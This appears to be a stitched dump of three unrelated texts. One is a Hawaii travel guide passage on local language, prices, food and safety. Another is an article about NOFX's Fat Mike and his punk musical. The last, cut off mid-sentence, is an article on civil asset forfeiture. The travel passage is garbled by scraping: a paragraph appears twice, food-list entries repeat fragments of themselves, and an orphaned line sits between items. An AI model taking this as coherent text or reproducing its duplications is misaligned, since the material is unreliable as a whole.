72.\"\n\nIf you ask for directions, they will likely not be given in terms of compass direction. Instead you will probably receive relative directions based on landmark. Common landmarks include mauka (toward the mountains), makai (toward the ocean), and on Oahu, ʻEwa (toward Ewa Beach, roughly west) and Diamond Head (toward Diamond Head, roughly east). So a query for a grocery store might be met with \"go two blocks makai, turn right on King and it's half a mile up on the mauka side of the street.\"\n\nBy moped/scooter/motorcycle [ edit ]\n\nScooters are also an excellent alternative to getting around the islands. Rental rates are fairly cheap (about $50/day, or $135 for three days). The scooters are also fun to ride and are cheap on gas (typical mileage is 100-130mpg). For scooters that can go over 35mph or have an over 49cc engine, you'll need a motorcycle license. Mopeds don't require a license, but the driver must be over 15, and it's illegal for two or more persons to ride a moped, although this may not be enforced in more remote areas such as Big Island. On most islands, you can also rent out Harley-Davidson motorcycles.\n\nTalk [ edit ]\n\nHawaiian and English are the official languages of Hawaii. However English is by far the main spoken language. There are some subtle differences in usage (see below), but standard English is universally understood in Hawaii. Hawaiian \"pidgin\" English, spoken by many locals, incorporates bits of Hawaiian, Chinese, Japanese, Filipino, Portuguese and many other languages, in addition to its own unique idioms. As Japan is the most important international tourist market in Hawaii, many tourist destinations offer information in Japanese and have personnel who can speak Japanese. There are also many ethnic communities that speak languages such as Mandarin, Cantonese, Tagalog, Ilocano, Vietnamese, Korean, Samoan and the native Hawaiian language.\n\nLearning a few words of Hawaiian can be fun and useful. Some signs in Hawaii use Hawaiian words, and most street signs use Hawaiian names. The following is a brief primer on Hawaiian pronunciation:\n\na as in father e as in buffet i as in machine o as in phone u as in fruit\n\nai, ae roughly like the igh in high au, ao roughly like the ow in cow ei roughly the ay in hay ou roughly like the o sound in boat.\n\nThe Hawaiian alphabet consists of 13 characters: all 5 vowels plus 8 consonants (h, k, l, m, n, p, w, and the apostrophe) which are generally pronounced in Hawaiian as they are in English, except that w can also take on the sound of v in certain words. The apostrophe is actually not an apostrophe but an ʻokina, and represents a glottal stop: the following vowel is pronounced with a catch in the throat, much like the sounds in \"uh-oh\" are separated. A line above a vowel means that the vowel is extended and stressed. Before the Hawaiian language was standardized, the alphabet consisted of sounds from all 26 English phonetic syllables. Some words included \"s\", and \"b\", such as \"Boki\" for \"boss\", and \"Iesu\", for \"Jesus\", when Christianity was introduced to the Hawaiian islands.\n\nEach vowel or diphthong is pronounced separately. For instance, the highway connecting Honolulu and Kaneohe on Oahu is called the Likelike Highway, and is pronounced LEE-keh-LEE-keh, not like-like.\n\nSome useful words include:\n\nHello. Aloha. (ah-LOH-hah) Goodbye. Aloha. (ah-LOH-hah) Love aloha (ah-LOH-hah) (So you indirectly refer to \"love\" when you first see someone and when they have to go) Thank you. Mahalo. (mah-HAH-loh). (Although this word is found on fast food trash receptacles around the islands, it does not mean \"trash\".) Finished, done Pau. (pa-oo) Help kokua (koh-KOO-ah) Woman wahine (wah-HEE-ne) Man kāne (KAH-ne) Child keiki (KAY-kee) Local resident kamaʻaina (kah-mah-EYE-nah) Toward the mountains mauka (ma-OO-kah) Toward the ocean makai (mah-KIGH)\n\nAvoiding misunderstandings [ edit ]\n\nAs mentioned above, standard English is understood in Hawaii, and Hawaii residents are generally very friendly. However, there are some subtle differences in word usage. When talking with Hawaii residents, be aware of the following differences in word usage to avoid miscommunications. Also see Respect below.\n\nAlways refer to the continental United States as \"the Mainland\" rather than \"the States.\" For instance, say \"Back on the Mainland...\" instead of \"Back in the States...\" Hawaii has been one of \"the States\" since 1959, and the Hawaiian sovereignty movement notwithstanding (see Respect below), most Hawaii residents are proud to be part of the United States. Using the term \"the States\" (implying that Hawaii is somehow foreign) may be seen as naive at best and condescending at worst. However, don't be surprised if some local people are condescending towards you because you are from the mainland. The \"local\" vs. \"mainland\" difference is something local people are only too happy to point out. Also, \"mainland\" includes places like Manhattan, Key West, Long Island, and Bar Harbor, even though those locations are all on islands themselves.\n\nFor instance, say \"Back on the Mainland...\" instead of \"Back in the States...\" Hawaii has been one of \"the States\" since 1959, and the Hawaiian sovereignty movement notwithstanding (see Respect below), most Hawaii residents are proud to be part of the United States. Using the term \"the States\" (implying that Hawaii is somehow foreign) may be seen as naive at best and condescending at worst. However, don't be surprised if some local people are condescending towards you because you are from the mainland. The \"local\" vs. \"mainland\" difference is something local people are only too happy to point out. Also, \"mainland\" includes places like Manhattan, Key West, Long Island, and Bar Harbor, even though those locations are all on islands themselves. Residents of Hawaii do not necessarily consider themselves \"Hawaiian.\" For instance, when asking a Hawaii resident, \"Are you a native Hawaiian?\" don't be surprised if his reply is \"No, I'm Japanese.\" On the Mainland, for example, a Californian means any person who lives in (or has ties to) California. However, in Hawaii, the terms \"Hawaiian\" or \"native Hawaiian\" are reserved to mean someone who is descended from the aboriginal people of Hawaii. This definition even appears in state laws. Because Hawaii is made of people of various ethnicities, someone whose family may have lived in Hawaii for generations may still not be Hawaiian by the above definition. To avoid misunderstanding, it is best to refer to Hawaii residents as such, or as Islanders, \"locals\", or kamaʻaina (as above), unless you know for a fact that they are of native Hawaiian descent.\n\nAs in the rest of the United States, U.S. dollars are the local currency. There are plenty of banks, ATMs, and money change offices in all cities. ATMs are scarcer on the North Shore of Oahu and other rural areas.\n\nFor a number of reasons, prices for most goods are more expensive than on the mainland, which means foreign visitors should focus on buying made-in-Hawaii goods. First, Hawaii is an island chain in the middle of the Pacific Ocean, which means most goods (and raw materials) must be transported there over great distances at enormous expense. Second, most goods are manufactured nowadays in East Asia, but thanks to certain U.S. federal laws, foreign-flagged container ships are prohibited from stopping at Honolulu to unload goods bound for Hawaii and load goods bound for the mainland. Instead, those ships proceed directly eastbound from East Asia (passing Hawaii in the process) to the West Coast of the United States, where distributors then repack Hawaii-bound goods and send them westbound on domestic-flagged container ships. Once those goods finally reach Hawaii, their retail prices must necessarily include all those additional ocean transportation costs.\n\nHawaii has a 4% general excise tax (GET) statewide on the gross receipts of all businesses, which is generally visibly passed on the consumer as a de facto 4.166% \"sales tax.\" As of 2007, the City and County of Honolulu adds an additional half-percent on the excise tax rate, making the \"sales tax\" rate on Oahu 4.712%. Unlike a true sales tax, the GET is levied on gross receipts of all businesses, not just consumer-facing ones. This means the GET is like a value-added tax in that it targets every segment in the supply chain, but it is actually much broader than a value-added tax in that it is levied on the entire final price at every segment. A true value-added tax targets only the value added by each segment. Even worse, the GET is actually levied on itself (in the sense that it is levied on the final price, but then the final price goes up because the tax has been added, and so on in circles), leading to the strange percentages noted above.\n\nClothing [ edit ]\n\nOther than the stereotypical grass skirt (which is not generally worn in Hawaii except by hula dancers), no pieces of clothing are more associated with the Islands than the aloha shirt and the muʻumuʻu (\"muumuu\" in English).\n\nThe ever-present aloha shirt comes in a wide variety of designs. On one end, there are the brightly colored, tourist-oriented, polyester aloha shirts that many tourist-oriented stores throughout the Islands carry. On the other end of the spectrum are the type of aloha shirts that have become standard business attire among businessmen in Hawaii, in the same way that the business suit is on the mainland. These aloha shirts are usually cotton-polyester blend and are \"reverse print.\" Reverse print means that the design is printed on the inside of the shirt, resulting in a more muted, businesslike look. This kind of aloha shirt can be found in department stores.\n\nFor women, the muʻumuʻu is a long Hawaiian dress, usually made of cotton, that hangs loosely from the shoulder.\n\nA special note on shoes: The item commonly referred to on the Mainland as a \"sandal\" or \"flip-flop\" (or more limited \"thong\") are called on the islands a \"slipper\" or \"slippa\". Using a mainland term for the shoe will get you a quizzical look from locals. Call them by their island name and they will instantly know what you are talking about.\n\nMade in Hawaii [ edit ]\n\nOne of the most popular souvenirs to buy in Hawaii are locally made bath & body products. The islands feature some of the most unique and refreshing fragrances in the world which you can easily find in Hawaiian shampoos, body lotions, soaps, oils, incense, floating candles, and much more.\n\nThe Hawaiian islands offer a vast number of activities. Hula dance lessons and Ukulele lessons are popular among tourists. Hiking and eco tours are popular on most islands, with opportunities for horseback riding, ATV, air tours, and other methods of exploring the landscape. Museums and historical sites such as Pearl Harbor are also to be found throughout the islands. Cultural activities such as the Polynesian Cultural Center on Oahu also make for interesting day-long activities.\n\nOahu is famous for Pearl Harbor tours, but also popular are shark snorkel dives in cages, Waikiki snorkel tours as well as around Oahu Tours where you will see all the major highlites of Oahu including Diamond Head, the North Shore and Dole Plantation where you can sample menu items made from fresh picked pineapples.\n\nMaui is the location for humpback whale watching from December 15 to April 15 each year as the massive humpbacks migrate to Hawaii's warm waters to bear their calves. Also famous from Maui is the Molokini Crater which is a partially submerged volanco crater that you can snorkel at.\n\nKauai is untamed and beautiful. It has been featured in many major motion pictures over the past two decades. See this island by land or by air to take in the true beauty of this island.\n\nThe Big island is the volcano island where you can take a land tour or fly over the incredible huge volcano on a helicopter tour. Doors off flights allow you to feel the heat from the volanco, an amazingly unique experience. Also on the Big Island you have the rare opportunity to swim with wild dolphins, not captive ones.\n\nHawaii is best known for its beaches and water activities. Surfing is practically a religion in Hawaii, and scuba diving and snorkeling opportunities exist nearly everywhere. In addition, jet skiing, parasailing and kayaking are available in tourist areas.\n\nLearn [ edit ]\n\nTourists who want to get a taste of Hawaiian culture can sign up for classes in hula, surfing and lei-making at most tourist destinations.\n\nThere also a number of cultural and historical centers on Oahu well worth your time, such as the Bishop Museum and Iolani Palace.\n\nIf you have the money, the time and the inclination, the Polynesian Cultural Center provides a window into Polynesian culture. As its name implies, the Polynesian Cultural Center covers not just Hawaii but also the cultures of Tahiti, Fiji, Samoa, Tonga, Easter Island and the Maori people of New Zealand.\n\nThe outer islands also have destinations such as Maui Center for Culture and the Arts and the Big Island has the Hilo Art Museum. the Lyman House Museum and the Pacific Tsunami Museum as well as the University of Hawaii's ʻImiloa Astronomy Center and Kula Kai Caverns.\n\nWork [ edit ]\n\nGiven the current economic boom, the unemployment rate in Hawaii is at its lowest point in many years, as of February 2018, at 2%, among the lowest nationwide. Hawaii is not an easy place to legally find casual work for non-US work permit holders. To apply for a local government job, by law you must be a Hawaii resident. This is changing though. Currently, police officer applicants do not have to be residents.\n\nVolunteering [ edit ]\n\nVolunteering in Hawaii is very common for many visitors interested in eco-tourism. More and more people every year sign up with an organization called WWOOF Hawaii [12], to be a part of the organic movement in Hawaii. Through WWOOF Hawaii, members can get in touch with over 280 organic farms throughout 5 of the main Hawaiian islands and volunteer anywhere from a couple weeks up to a year. Not only do members get to learn about organic farming in Hawaii, but they also receive fresh organic food and get to live on a farm.\n\nPlate lunch, with ahi poke, lomi lomi salmon, kalua pork, pork lau lau, steamed rice, haupia\n\nTaro, poi, steamed rice and lomi lomi salmon during Makahiki festival\n\nSeared ahi and wasabi beurre blanc sauce\n\nSaimin\n\nSPAM musubi\n\nChocolate-covered macadamia nuts\n\nContemporary food in Hawaii, like the language and popular culture, is a medley of traditional Hawaiian, Asian, and Portuguese. Pacific \"fusion\" cuisine was largely invented in Hawaii. Well-known local chefs include Sam Choy, Alan Wong, Russell Siu, Roy Yamaguchi, and George \"Chef Mavro\" Mavrothalassitis. Seafood is, of course, fresh and tasty. Local beef comes from ranches on Maui and coffee is grown on the Big Island. Tropical fruits such as pineapple, mango, bananas, guavas, and papaya, as well as fresh sugar cane, can be bought in most corner stores (although you may be surprised to learn that many of those fruits are now imported from distant locales such as The Philippines & Brazil).\n\nOne of the most common ways that local food is served is in the form of plate lunch, usually meat or fish with two scoops of rice and macaroni salad. It's always a good deal at any lunch wagon, mall, or outside food court. L&L Drive Inn [13] and Zippy's [14] are probably the most widely distributed chain of plate lunch spots in the Hawaiian islands. Branches of L&L are in some locations on the Mainland as well (as L&L Hawaiian Barbecue).\n\nAnother way of enjoying local food when roaming around the island is to keep an eye out for the converted trucks/vans that are parked in their regular spots in gas station parking lots, some parks and a variety of places on the island. They offer the \"plate lunches\", are popular with the locals and provide great meals (on plastic plates} at very reasonable prices. There is no reason to fear them, they are very common and popular.\n\nPerhaps the best setting for tourists to enjoy traditional Hawaiian food is at a luau (lū‘au), a traditional Hawaiian feast. Tourists can find luaus at various locations in the Islands, including many of the major resort hotels. At a modern luau traditional Hawaiian favorites are served buffet style, and there is also Hawaiian music, hula, and other Polynesian entertainment. The downside is that they can be pricey and prices can vary widely; expect to pay between USD $50 and $90 per adult and about half that per child.\n\nDishes that are often found at luaus include:\n\nLomi salmon , salted salmon hand-mixed ( lomi-lomi means \"to massage\") with tomatoes, onions, and pepper; like an island salsa\n\n, salted salmon hand-mixed ( means \"to massage\") with tomatoes, onions, and pepper; like an island salsa Kālua pig , pork wrapped in banana leaves and steamed inside an imu (ground boiler); similar to pulled pork\n\n, pork wrapped in banana leaves and steamed inside an (ground boiler); similar to pulled pork Pipi kāula , Hawaiian style beef jerky\n\n, Hawaiian style beef jerky Poi , ground and boiled taro root paste\n\n, ground and boiled taro root paste Laulau , pork & butterfish (black cod) wrapped in ti leaves then steamed\n\n, pork & butterfish (black cod) wrapped in leaves then steamed Lū‘au , taro leaves baked with coconut cream and usually octopus (this dish inspired the modern name of the Hawaiian feast)\n\n, taro leaves baked with coconut cream and usually octopus (this dish inspired the modern name of the Hawaiian feast) Haupia, a gelatin-like dessert prepared from thickened coconut milk; famous for being a mild laxative\n\nOther local dishes include favorites such as the following:\n\nAhi , yellowfin tuna, excellent as sashimi (Japanese style sliced raw fish) or as poke (chopped and seasoned raw fish).\n\n, yellowfin tuna, excellent as (Japanese style sliced raw fish) or as (chopped and seasoned raw fish).

Can be eaten for breakfast or lunch. Chicken katsu, fried chicken cutlet with savory sauce. Usually served with rice and mac salad.\n\nIf you are roaming the island away from tourist areas, you may find restaurants are scarce. Many of the numerous golf courses have dining rooms open to the public that offer great meals at very good prices. They seem to welcome the non-golfer. For specific places at which to eat, see the individual island or city articles. Be sure to check the coupon books that are available at display stands for meal specials.\n\nPopular local snacks are also heavily influenced by the large mix of cultures present in Hawaii, primarily the Chinese and Japanese. Since many of these snacks are unique to Hawaii and cannot be found anywhere else, consider purchasing a few bags from any grocery store to bring on your travels. A large portion of local snacks fall under the category known as \"Crack Seed\" which refers to a variety of pickled, candied, and dehydrated fruit snacks of Chinese origin.\n\nThe most popular iterations of Crack Seed snacks are:\n\nLi hing mui - Salted dried plums that are especially popular with the younger locals. Li Hing Mui is known for its unique sweet, salty, and sour flavor. It is commercially sold either with the plum seed intact or seedless and also in a powdered form that can be sprinkled onto arare, fruits, gummy bears,and many other snacks.\n\nPickled or dried fruits - Mangoes are usually dehydrated for a sweet snack or kept wet and flavored with Li Hing Mui powder. Lemon and orange peels are also salted and dried for a salty/sour snack.\n\nOther popular local snacks include:\n\nArare - Japanese rice crackers flavored with soy sauce that come in many different shapes and sizes. Arare is commonly paired with dried seaweed, li hing mui powder, or popcorn. Also commonly referred to as \"Kaki Mochi\" or \"Mochi Crunch\".\n\nDried Seafood - Dried cuttlefish and octopus strips, known by their Japanese names \"Ika\" and \"Tako\", are very popular snacks. Tuna, or \"Ahi\", is also dried and made into Ahi Jerky.\n\nMacadamia nuts - Sweet nuts commonly associated with Hawaii as a whole. Dry roasted macadamia nuts are commercially sold plain, with flavoring, or in chocolate. Macadamia nuts in snack form are more popular with tourists than with locals and are usually given as gifts.\n\nThe legal drinking and purchasing age of alcoholic beverages is 21. However Hawaii is one of the 26 states that allow underage consumption of alcohol for religious purposes, only if the minor is authorized. [15]\n\nBeer: there are a number of excellent local brewpubs in Hawaii. Mehana, Sam Choy's, Honu, Waimea Brewing Company, Liz's Pub, Keoki's and Kona Brewing Company all brew beer in Hawaii or brew it on the mainland and ship it to the islands. The largest of the group is Kona Brewing, which has won several national awards and runs two brew pub restaurants in the islands (one in Kailua Kona, the other in Hawaii Kai on Oahu).\n\nStay safe [ edit ]\n\nCrime [ edit ]\n\nTheft is a big problem in cities as well as beaches and parks. If you are camping on a beach, keep bags locked in a car (but don't assume that they are safe in the trunk, especially if you are driving a rental) and keep valuables in a hidden money belt. Although Hawaii is generally considered relatively safe, it does have some violent crime, especially in Honolulu. Consequently, women should not walk alone in unlit areas. Although Honolulu has one of the lowest violent crime rates of metro areas in the U.S., use your common sense. Stay smart and act as if you were in your own home city: lock doors, lock cars, and don't leave valuables lying around.\n\nIn general, do not bring anything to the beach that you will not use. If you absolutely must, keep valuables to a minimum (such as money), and bring a friend. If you are using a rental car and do not have valuables in it, leaving the window open can ward off window damage from break-ins. Purchasing local bumper stickers and placing them on your car can also ward off would-be thieves, who may mistake your car for being a local's.\n\nGambling [ edit ]\n\nHawaii isn't the best place in the U.S. for gambling. Unlike most of the lower 48s, Hawaii is one of the few U.S. jurisdictions with a strict enforced law against gambling of any type. All forms of gambling are illegal in Hawaii, and it isn't recommended to get involved in any activity of the sort. In fact, promoting gambling to any degree is a class C felony in the state.[16]\n\nStay healthy [ edit ]\n\nHospitals in Hawaii meet U.S. standards for care, and can be found in the urban areas of each island. The hospitals in Honolulu are larger and have the most advanced equipment; the hospitals on the neighbouring islands provide general care. There is currently a shortage of specialists on the Neighbor Islands. Depending on where you are and the seriousness of your condition, be advised that you may need to be medically evacuated to Honolulu for treatment.\n\nThe main tourist areas of each island have walk-in urgent care clinics where you can receive non-emergency treatment for whatever ails you. Some clinics even make hotel room calls. Check with the local phone book or your hotel. In Waikiki, try Doctors on Call (808-971-6000). The clinic is open 24 hours a day, 7 days a week.\n\nIf you plan to go hiking in the backcountry or go swimming in freshwater pools in Hawaii, be advised of the risk of catching leptospirosis. Leptospirosis generally causes flu-like symptoms; in rare cases it can be fatal; the incubation period can be from 2-30 days after exposure. Do not swim in freshwater pools if you have open sores; see a doctor if you develop flu-like symptoms after hiking or swimming.\n\nBe sure to have travel health insurance. If you are a U.S. resident with private health insurance, you should consult your insurance carrier to determine what copayments apply and to what extent your insurance is accepted in Hawaii by doctors and hospitals in the event you need health care while on your trip. See Stay healthy in United States of America for more information.\n\nWhen going to the beach/swimming or spending extended periods in the sun, always wear suntan lotion or sun guard to protect your skin from burns. Do not underestimate the Hawaiian sun, the UV ray index gets extremely high throughout the year. UV rays also pass right through clouds, so you can get still get sunburned on cloudy or overcast days.\n\nBe aware that box jellyfish arrive near off shore on beaches throughout the state about 7 to 10 days after the full moon every month. Box jellyfish stings are incredibly venomous and painful, but rarely kill humans. Always listen to lifeguards as they will know about jellyfish conditions and are trained to render first aid for stings. You can also check for box jellyfish warnings ahead of time on Hawaii government websites and local news stations.\n\nCope [ edit ]\n\nDress [ edit ]\n\nHawaii's laid-back reputation extends to dress: with ideal weather year-round in most places, shorts are always appropriate around the islands. Long pants are fine, too, and you will still be quite comfortable. You do normally need to wear a shirt in public; going bare-chested is for the beach, although businesses near the beach are tolerant of it, particularly outside of the city. Sandals and flip-flops are very common, but note that they're always called slippers or slippa by locals. Going barefoot off the beach is uncommon, but again, businesses may tolerate it to some extent.\n\nFor the beach or pool, boardshorts or swimming trunks for men are the most popular, though with so many visitors from Asia, speedos are welcome too. Female toplessness is legal in Hawaii, if uncommon. Swimming nude is illegal, although there are a few isolated beaches on each island where people risk it. Unless you're spending the day trekking from beach to beach, save beachwear for the beach and wear regular clothes.\n\nBusinessmen in Hawaii have the rare distinction of forgoing suits and wearing slacks with muted aloha shirts. As a visitor, you would probably be overdressed in a suit; a dress shirt (with or without a tie) and slacks would be fine. If you do wear an aloha shirt for business, wear it like you would any other button-up shirt for business: tuck it in, button all but the top button, and wear an undershirt if that's your style.\n\nThe business aloha shirt extends also to dressing up for fine dining, entertainment, and even church; some preachers wear business aloha shirts for church services. As a visitor, just put on a collared shirt, shoes, and, depending on the restaurant you're going to, either shorts or slacks. Ties and jackets will never be necessary.\n\nRespect [ edit ]\n\nIn general, American standards of etiquette (see Respect in United States of America) apply in Hawaii. Hawaii, however, has certain cultural differences, owing to the Native Hawaiians and the large population of Asians and people of Asian descent.\n\nAs is the custom in many Asian countries, always remove your footwear when entering the home of an island resident, if so invited.\n\nHawaiian culture should be respected and travellers should be sensitive to the state's rich cultural heritage and diversity - and the fact that the tourist experience of Hawaiian culture may only scratch the surface. For instance, there are many heiau (temples) in the Islands, where the ancient Hawaiian religion was practiced. Some of these have become tourist attractions in their own right, but visitors should nevertheless treat these places with the same level of respect one would show at a place of worship.\n\nIf you visit Hawaii Volcanoes National Park, you will no doubt hear about Pele, the Hawaiian goddess of volcanoes. An urban legend has it that people who have taken volcanic rock from the slopes of Mauna Loa or Kilauea have suffered various misfortunes; it is believed that it is the wrath of Pele. In any case, it is illegal to take rocks or other material from a national park.\n\nAlso, the status of Native Hawaiians vis-a-vis the U.S. federal government has become a hot topic in recent years, with some Native Hawaiian groups seeking a degree of sovereignty for the Hawaiian people as redress for the overthrow of the Hawaiian monarchy and U.S. annexation in the 1890s. (Honolulu is home to the only royal palace on U.S. soil.) There is currently no consensus among Native Hawaiians on what form this sovereignty should take, with some preferring the status quo of ordinary citizenship, some seeking a status similar to that of Native Americans, and some wanting complete independence and secession from the Union. In addition, private and government programs that benefit Native Hawaiians have been called into question via a series of lawsuits that have received extensive coverage in local media. Discussions of Hawaiian sovereignty and programs can arouse a variety of strong opinions (both in support and in opposition) among Hawaii residents of all ethnicities, and the uninitiated visitor would be wise to avoid bringing up these topics in casual conversation.\n\nSome Native Hawaiians may attribute accidents caused by nature (such as a landslide at Sacred Falls that killed several people) to the Menehune punishing tourists disrespecting the land. Menehune or not, Hawaii is one of the most beautiful places in the world and its sites deserve our respect. Bottom line: respect the land and the people; there may be more there than meets the eye.\n\nHawaii uses the U.S. postal system [17] with zip/post codes ranging from 96701 to 96899. Internet access can be found in most tourist areas and many hotels. General wi-fi access is available only at select hotels and cafes. The public libraries offer Internet access, but only for library cardholders. Visitors may purchase a 3-month library card for $10.00.\n\nHawaii's area code is 808. When dialing any off-island telephone number (to the mainland, Canada, Bermuda and the Caribbean), dial 1 + area code + phone number, otherwise dial 011 + country code + city/area code + phone number. You must include the 808 area code when calling another island.\n\nGet out [ edit ]\n\nLocated in the middle of the Pacific Ocean Hawaii has few nearby neighbors.\n\nCalifornia - The point of departure for many visitors from the continental United States.\n\n- The point of departure for many visitors from the continental United States.

  "latent_16246": "Long before Fat Mike — the mohawked, frequently bratty, always larger-than-life frontman of NOFX — ever set foot on a stage, he was just little Michael John Burkett, an 8-year-old boy with a flair for the dramatic.\n\nRoll the tapes back with us for a moment and witness the child, crouched in front of his parents' television set in Los Angeles, a cassette-tape recorder in hand, capturing the songs of The Rocky Horror Picture Show — the lyrics and innuendo of which he barely grasps. He's transfixed. He had caught part of the movie a week earlier, and then looked desperately through TV Guide to find out when he could see it again. He was waiting, finger on the record button, as the opening credits rolled.\n\n\"It was so fucking weird,\" the singer and bassist recalls now, two weeks before Home Street Home, his own musical — a project about 15 years in the making — is set to debut in San Francisco. \"I just remember that I liked the songs so much. And then that was my only record for the next three or four years.\" His parents, he says, didn't even have a stereo.\n\nNo one would call Burkett \"Fat Mike\" for another dozen years. Nor did anyone have an inkling he'd grow up to front one of the longest-running and most celebrated bands in West Coast punk; co-founded a record label that issued compilations protesting the re-election of President Bush; or become known as much for his nonstop partying, onstage antics, and alcoholic-court-jester persona as for his songwriting, singing, and bass playing. (Examples of said antics: getting banned for life from Emo's in Austin for allegedly urinating into a bottle and then serving it to fans, crafting an alter ego as an evil clown who squirts cocaine out of his lapel flower and, most recently, kicking a fan who approached him onstage in Australia square in the face.)\n\nBut NOFX has been at it for 32 years, and when your band is known for the kind of behavior NOFX has become known for, there's a rather short list of things you can do that will shock people.\n\nNo. 1 on that list: Write an honest-to-goodness Broadway-style musical. A real one, a big one, with genuinely catchy, sweeping harmonies and choruses that conclude in a proud cascade of \"nah-nah-nah\"s. For extra shock factor, include the voices and instruments of about a dozen other punk-rock luminaries — members of the Descendents, Lagwagon, No Use for a Name, Alkaline Trio, Dropkick Murphys, Old Man Markley, Dance Hall Crashers, Hedwig & the Angry Inch's Lena Hall, and more — on the accompanying concept record and in the production's live band.\n\nBelieve this: Home Street Home, which debuts at Z Space in San Francisco Feb. 20 and runs through March 7 (opening night is already sold out) will catch punk fans by surprise if they go in expecting NOFX: The Musical. Sure, there's some teenage humor; the main characters, after all, are teenagers. It's also truly dark, heartbreaking, and challenging in places: The songs' lyrics and plotlines are heavy on abusive home lives and self-harm. Casual drug use, prostitution, and BDSM (bondage, dominance, and sadomasochism) also figure prominently. These themes are treated with a celebratory air in some parts of the play; in others, they're simply approached with pragmatism, a told-from-the-inside sense of veracity, and a rarely seen absence of moral judgment.\n\nBut at the end of the day, \"Fat Mike\" Burkett and his co-writers — the professional dominatrix and adult film actress Soma Snakeoil (Burkett's girlfriend), and Jeff Marx, the Tony Award-winning composer of Avenue Q — will tell you earnestly that Home Street Home is really a story about family. It's about finding the people who will love, accept, and protect you when your biological family can't, or won't. And if those people also happen to be teenage runaways who initiate you into group sex and hard drugs while living in a squat? Well, that's reality for you.\n\nOn a Wednesday afternoon two weeks before the musical's debut, Burkett has one eye on rehearsals and one eye on his phone. An employee at Fat Wreck Chords, his label, is giving him updates about reactions to the concept record, which is streaming online for the first time today. \"They said it's getting a ton of shares on Facebook,\" Burkett reports, with a mix of surprise and relief.\n\nAmong the 15 or so other people milling about the rehearsal space, there's a conversation about whether or not it's common knowledge that Richard Pryor set himself on fire while on crack, and whether or not that would make for a funnier lyric in a musical number than the one currently in place about Aaron Sorkin's coke problem. Richard Israel, the play's award-winning director, gives actors verbal notes such as \"Remember, the pee bucket is already going to be over there,\" and \"Look toward the center, the tampon will be hanging from the chandelier.\"\n\nToday is the day the actors are getting their punk haircuts, meaning the crew members — all NOFX friends and extended family — are hard at work trying to make an ensemble cast of mostly fresh-faced, clean-cut young actors who exercise and take good care of their voices look as if they've been living on the street and doing drugs. (A casting call included the directive, \"All singing and musical performances are to be delivered with a punk sensibility.\")\n\nOne crew member brings an actor over to Burkett for an assessment of the young man's new mohawk. \"A little shorter up front,\" Burkett advises, before turning eagerly back to the scenes in action, and looking every bit like an overage high school drama club kid who is finally, at long last, in his true element. At 48, wearing long cutoff shorts and an untucked button-up T-shirt over arms full of tattoos, Fat Mike looks decidedly, permanently adolescent.\n\nBurkett's own signature mohawk, bright red at the moment, matches shocks of Soma Snakeoil's hair. Aside from tattoos, though, that's about the only similarity in their respective aesthetics. Goddess Soma — or just Goddess, as Mike and others call her — is seated next to him, dressed in a tight, shiny black dress expertly laced in important places, and rocking 6-inch stilettos with the nonchalance of, well, someone who rocks 6-inch stilettos every damn day of her life.",
  "latent_16263": "Attorney General Jess Sessions is in favor of civil asset forfeiture. Above, then-Sen. Jeff Sessions with President Trump at Trump Tower in New York on Oct. 7. Mike Segar/Reuters\n\nFor years, law enforcement agencies around the country have been fighting attempts to reform civil asset forfeiture—the practice of taking money and property from people who haven’t been charged with or convicted of a crime. Now those agencies have a friend in the nation’s capital. Last week, Attorney General Jeff Sessions strengthened law enforcement’s ability to seize people’s assets nationwide. Sessions says he wants to clamp down on drug traffickers and take property away from criminals. But the cozy relationship between law enforcement and the administration indicates the new scheme is likely to fill the pockets of cops and prosecutors while unnecessarily criminalizing poor people of color.\n\nSessions’ announcement came at a time when Democrats and Republicans alike are pushing back on civil forfeiture. An attempt to reform the practice even emerged this year in Texas, which has one of the worst civil forfeiture records in the country. Texas law enforcement agencies raked in an average of $41.6 million in forfeiture proceeds annually between 2001 and 2013. Earlier this year, lawmakers in this state filed a slate of bills that offered hope for reform. The bills would have required a conviction before property was seized, restricted what could be taken, and forced the state to prove seized property was related to a crime. The main opposition to the bills came from district and county attorneys, who testified before a legislative committee and wrote opinion pieces defending forfeiture as a public safety imperative. In the end, most of the bills didn’t make it out of subcommittee, and the ones that did weren’t voted on.\n\nIn Texas and the vast majority of U.S. states, forfeiture is driven by profit motives. Law enforcement agencies echo Sessions in saying the practice helps crack down on drug cartels, allowing cops to seize contraband and property that could serve as evidence in criminal cases. Lee McGrath, the senior legislative counsel at the Institute for Justice, a libertarian public-interest law firm that tracks forfeiture trends, says that this is not how forfeiture works in practice. Police, sheriffs, and local prosecutors seize small sums of money and other valuables—including electronics, cars, and houses—then sue the owners of those items so they can take ownership themselves. Most people whose property is taken don’t have the right to an attorney to fight for their belongings, since they haven’t been charged with a criminal offense. A 2014 Washington Post investigation that analyzed 400 federal court cases involving civil forfeiture uncovered that the majority of people who’d been victimized by the practice were nonwhite. Additional investigations have yielded similar findings in Oklahoma, California, and Pennsylvania.\n\nState laws stipulate what can be seized and forfeited. But local and state law enforcement agencies have a second avenue for collecting money and assets if state law doesn’t permit them to do so: the federal equitable sharing program. Under that program, local agencies seize money and property and hand it over to the federal government, which then returns a percentage of the profit. The program distributed $1.7 billion to local and state police departments between 2001 and 2014.\n\nOutside of Texas, efforts to reform civil asset forfeiture have progressed in multiple jurisdictions. The most comprehensive reforms have emerged in those locales where the anti-forfeiture movement had strong bipartisan support and law enforcement didn’t put up a strong fight. In 2014, Washington, D.C., became the first city in the U.S. to pass a major reform bill that slashed financial incentives for law enforcement to take property. Before the bill passed, police had made 12,000 seizures, taking 1,000 cars and $5.5 million in cash, between 2009 and 2014. Profits from property taken under local law went into a general fund for the city, from which police collected very little money—roughly $30,000 a year. As a consequence, police turned to the equitable sharing program, using federal law to seize cash and belongings, transferring the assets to the federal government, and receiving a big cut in return. Police racked up approximately $670,000 annually from the program, according to a 2014 Washington Post analysis\n\nThe reform effort in D.C. was set off by litigation challenging the city’s bond requirements, says Laura Hankins, general counsel of the Public Defender Service for the District of Columbia, which sued the District in 2013 for seizing cars without due process. City law had required people to spend hundreds—sometimes thousands—of dollars in bond money to fight for their property. The public defender’s office used momentum from that legal battle to draft legislation that would both eliminate the bond requirement and curb civil forfeiture. The police chief at the time, Cathy Lanier, reportedly agreed with the bill’s objective of making the system more fair. Despite opposition from the office of the D.C. attorney general, the bill passed, ending the equitable sharing partnership with the feds. The caveat was that the new law wouldn’t go into effect until 2018. Pushing back implementation gave the police department time to find other ways to supplement its budget.\n\nIn 2015, New Mexico became the first state to ban civil forfeiture. Law enforcement was previously entitled to 100 percent of forfeiture profits under state law, and agencies in the state also received an average of 